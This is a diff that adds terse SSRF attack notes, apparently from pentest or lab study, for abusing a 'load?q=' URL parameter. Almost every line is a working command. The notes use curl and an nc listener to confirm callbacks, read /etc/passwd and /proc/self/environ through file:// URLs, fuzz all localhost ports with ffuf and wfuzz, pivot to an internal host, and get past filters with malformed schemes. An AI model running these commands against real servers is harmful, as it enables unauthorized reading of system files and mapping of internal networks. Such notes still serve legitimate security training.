@@ -1,0 +1,41 @@
+-> Connect to the target (follow redirects):
+curl -i -s -L http://<TARGET IP>
+
+1. Start listener
+nc -lnvp 80
+
+2. Execute command in second terminal to see if a connection happens
+curl -i -s "http://<TARGET-IP/load?q=http://<LOCAL-IP>"
+
+-> Request local file via target server:
+curl -i -s "http://<TARGET-IP/load?q=http://<LOCAL-IP>/index.html"
+
+- > Retrieve files from target system:
+curl -i -s "http://<TARGET IP>/load?q=file:///etc/passwd"
+
+-> Scan for internal ports listening only to localhost:
+1. Create file containing ports:
+for port in {1..65535};do echo $port >> ports.txt;done
+
+2. Check the response size for a non-existent service:
+curl -i -s "http://<TARGET-IP>/load?q=http://127.0.0.1:1"
+
+3. Fuzz the ports with ffuf/wfuzz to :
+ffuf -w ./ports.txt:PORT -u "http://<TARGET-IP>/load?q=http://127.0.0.1:PORT" -fs 30
+wfuzz -z file,ports.txt "http://<TARGET-IP>/load?q=http://127.0.0.1:FUZZ (filtering not working ¯\_(ツ)_/¯ )
+
+4. Visit the target:
+curl -i -s "http://<TARGET-IP>/load?q=http://127.0.0.1:PORT"
+
+5. Check behaviour of internal target:
+curl -i -s "http://<TARGET-IP>/load?q=http://internal.app.local/load?q=http://127.0.0.1:PORT"
+[==> Watch out, if the application has some kind of filter in place]
+[==> eg.: curl -i -s "http://<TARGET-IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:PORT"]
+
+6. Get the application to print out the current path:
+curl -i -s "http://<TARGET-IP>/load?q=http://internal.app.local/load?q=file:://///proc/self/environ" -o -
+
+7. Read the source of a file in the current directory:
+curl -i -s "http://<TARGET-IP>/load?q=http://internal.app.local/load?q=file:://///current_dir/filename"
+
+==> At this time a command other than a single one like "whoami" would have to be URL-Endoded 3 times. 
